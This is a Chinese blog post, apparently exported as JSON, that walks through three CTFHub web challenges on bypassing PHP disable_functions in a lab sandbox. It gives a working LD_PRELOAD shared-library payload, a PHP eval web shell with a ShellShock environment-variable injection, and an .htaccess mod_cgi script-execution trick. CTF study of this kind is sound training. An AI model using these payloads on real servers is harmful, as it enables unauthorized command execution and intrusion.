{"title":"CTFHUB技能树WEB进阶","uid":"a03591ba90db85acdb8cd060417faa18","slug":"CTFHUB技能树WEB进阶","date":"2020-09-24T08:57:34.000Z","updated":"2022-01-09T09:25:20.733Z","comments":true,"path":"api/articles/CTFHUB技能树WEB进阶.json","keywords":"A1andNS","cover":null,"content":"<h2 id=\"LD-PRELOAD\"><a href=\"#LD-PRELOAD\" class=\"headerlink\" title=\"LD_PRELOAD\"></a>LD_PRELOAD</h2><p>LD_PRELOAD，是个环境变量，用于动态库的加载，动态库加载的优先级最高，一般情况下，其加载顺序为LD_PRELOAD&gt;LD_LIBRARY_PATH&gt;/etc/ld.so.cache&gt;/lib&gt;/usr/lib。应该比较接近windows下的DLL文件。</p>\n<p>打开环境,提示用蚁剑去连接.</p>\n<p>看到了根目录的/flag但是问题是看不了.</p>\n<p>这里是要我们利用LD_PRELOAD来绕过disable_function限制</p>\n<p>写一个C脚本：</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;stdlib.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;unistd.h></span></span>\n\n<span class=\"token keyword\">__attribute__</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>__constructor__<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">void</span> <span class=\"token function\">angel</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">unsetenv</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"LD_PRELOAD\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/readflag > /tmp/a1andns\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>编译成hack.so文件</p>\n<p><code>gcc -shared -fPIC -o hack.so</code></p>\n<p>把他上传到tmp目录下，这个看心情随意。</p>\n<p>在web根目录下新建一个php文件</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> \n<span class=\"token function\">putenv</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"LD_PRELOAD=/tmp/hack.so\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">error_log</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>然后去url处包含一下这个文件，<code>?ant=include(&#39;alan.php&#39;);</code>就可以去tmp/a1andns查看flag了。</p>\n<p>ctfhub{5ceaed2cf789580e632a42cb4ef074388fc8473a}</p>\n<h2 id=\"ShellShock\"><a href=\"#ShellShock\" class=\"headerlink\" title=\"ShellShock\"></a>ShellShock</h2><p>bash破壳漏洞,蚁剑连接上去，和上一题一样不能执行命令。</p>\n<p>直接用蚁剑写一个php文件到web根目录。</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n    @<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'ant'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">putenv</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"PHP_test=() &#123; :; &#125;; tac /flag >> /var/www/html/a1andns\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">error_log</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"admin\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>然后用浏览器访问<a href=\"http://challenge-ac75bd92279208e8.sandbox.ctfhub.com:10080/alan.php\">http://challenge-ac75bd92279208e8.sandbox.ctfhub.com:10080/alan.php</a></p>\n<p>返回蚁剑中查看a1andns就可以得到flag</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">ctfhub&#123;270264686ebc48d07b8ec5dbc5a6082b533c790c&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h2 id=\"apache-mode-cgi\"><a href=\"#apache-mode-cgi\" class=\"headerlink\" title=\"apache mode cgi\"></a>apache mode cgi</h2><p>这里要用到两个文件一个是.htaccess，一个是mod_cgi</p>\n<p>关于mod_cgi，任何具有MIME类型<code>applicant/x-http-cgi</code>或者被<code>cgi-script</code>处理器处理的文件都被作为CGI脚本对待，并且由服务器来执行，然后把输出返回给客户端。可以通过两种途径使文件称为CGI脚本，一种是文件具有<code>AddType</code>指令定义的拓展名，另一个是文件位于<code>ScriptAlias</code>目录中。</p>\n<p>通过修改或创建.htaccess文件来利用apache的mod_cgi模块，直接绕过PHP的任何限制，来执行系统命令。</p>\n<p>先用蚁剑连接上后门，然后上传一个.htaccess文件和一个shell.alan文件</p>\n<p>.htaccess:</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Options +ExecCGI\nAddHandler cgi-script .alan<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>shell.alan:</p>\n<pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\"><span class=\"token shebang important\">#!/bin/sh</span>\n<span class=\"token builtin class-name\">echo</span> <span class=\"token string\">\"Hello,A1andNS!!!<span class=\"token entity\" title=\"\\n\">\\n</span>\"</span><span class=\"token punctuation\">;</span><span class=\"token builtin class-name\">cd</span> <span class=\"token string\">\"/\"</span><span class=\"token operator\">&amp;&amp;</span>./readflag<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>这里有一个坑点，必须要记得给shell.alan加运行权限，不然到时候服务器就会报错。</p>\n<p><code>?ant=chmod(&quot;shell.alan&quot;,0777);</code></p>\n","text":"LD_PRELOADLD_PRELOAD，是个环境变量，用于动态库的加载，动态库加载的优先级最高，一般情况下，其加载顺序为LD_PRELOAD&gt;LD_LIBRARY_PATH&gt;/etc/ld.so.cache&gt;/lib&gt;/usr/lib。应该比较接近win...","link":"","photos":[],"count_time":{"symbolsCount":"1.6k","symbolsTime":"1 mins."},"categories":[{"name":"CTF","slug":"CTF","count":44,"path":"api/categories/CTF.json"}],"tags":[{"name":"CTF","slug":"CTF","count":16,"path":"api/tags/CTF.json"},{"name":"WEB","slug":"WEB","count":39,"path":"api/tags/WEB.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#LD-PRELOAD\"><span class=\"toc-text\">LD_PRELOAD</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#ShellShock\"><span class=\"toc-text\">ShellShock</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#apache-mode-cgi\"><span class=\"toc-text\">apache mode cgi</span></a></li></ol>","author":{"name":"A1andNS","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"通达OA11.7后台sql注入到RCE复现","uid":"8e117461a44b784c60f14a08fb600518","slug":"通达OA11-7后台sql注入到RCE复现","date":"2020-09-26T12:15:21.000Z","updated":"2020-09-30T04:22:08.000Z","comments":true,"path":"api/articles/通达OA11-7后台sql注入到RCE复现.json","keywords":"A1andNS","cover":[],"text":"写在最前最近的Hvv期间爆出来一个通达OA的漏洞,红队大佬们太牛了.然后在网上看到了相关的一些文章,下面就实际来复现一下 复现环境 漏洞版本:通达OA11.7 靶机系统:Winodws 7 漏洞详情这里想要看源码,和之前复现通达OA漏洞一样的,需要去找一个解码工具,才可以看到源代...","link":"","photos":[],"count_time":{"symbolsCount":"5.6k","symbolsTime":"5 mins."},"categories":[{"name":"漏洞复现","slug":"漏洞复现","count":4,"path":"api/categories/漏洞复现.json"}],"tags":[{"name":"漏洞复现","slug":"漏洞复现","count":6,"path":"api/tags/漏洞复现.json"},{"name":"漏洞分析","slug":"漏洞分析","count":3,"path":"api/tags/漏洞分析.json"},{"name":"RCE","slug":"RCE","count":3,"path":"api/tags/RCE.json"},{"name":"代码审计","slug":"代码审计","count":2,"path":"api/tags/代码审计.json"},{"name":"SQL","slug":"SQL","count":1,"path":"api/tags/SQL.json"},{"name":"通达OA","slug":"通达OA","count":2,"path":"api/tags/通达OA.json"}],"author":{"name":"A1andNS","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"计算机相关知识补全-持续更新","uid":"16c3496fc2f40d1a9d04f017d5e5a1b7","slug":"计算机相关知识补全-持续更新","date":"2020-09-24T07:55:31.000Z","updated":"2020-10-12T08:12:40.000Z","comments":true,"path":"api/articles/计算机相关知识补全-持续更新.json","keywords":"A1andNS","cover":null,"text":"应用组件ImageMagickImageMagick图片处理是一套功能强大、稳定而且免费的工具集和开发包，可以用来读、写和处理超过90种的图片文件，包括流行的TIFF、JPEG、GIF、 PNG、PDF以及PhotoCD等格式。利用ImageMagick，你可以根据web应用程序...","link":"","photos":[],"count_time":{"symbolsCount":999,"symbolsTime":"1 mins."},"categories":[{"name":"学习笔记","slug":"学习笔记","count":36,"path":"api/categories/学习笔记.json"}],"tags":[{"name":"扫盲","slug":"扫盲","count":1,"path":"api/tags/扫盲.json"}],"author":{"name":"A1andNS","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}